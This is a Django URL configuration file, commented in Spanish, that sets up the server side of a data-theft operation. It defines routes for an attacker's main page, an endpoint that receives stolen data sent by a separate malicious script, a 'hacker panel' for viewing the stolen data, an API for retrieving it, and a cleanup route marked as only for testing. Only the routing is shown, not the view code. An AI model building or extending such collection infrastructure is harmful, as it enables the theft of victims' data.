from django.contrib import admin
from django.urls import path
from pnl_xa import views

urlpatterns = [
    path('admin/', admin.site.urls),
    
    # Ruta principal del atacante
    path('', views.index, name='index'),
    
    # Ruta donde llegan los datos robados (la usa el script malicioso)
    path('stl', views.rcb_stl, name='rcb_stl'),
    
    # Panel del hacker para ver los datos robados
    path('panel', views.panel_h, name='panel_h'),
    
    # API para obtener los datos
    path('api/stl', views.api_stl, name='api_stl'),
    
    # Limpiar datos (solo para pruebas)
    path('cln', views.cln, name='cln'),
]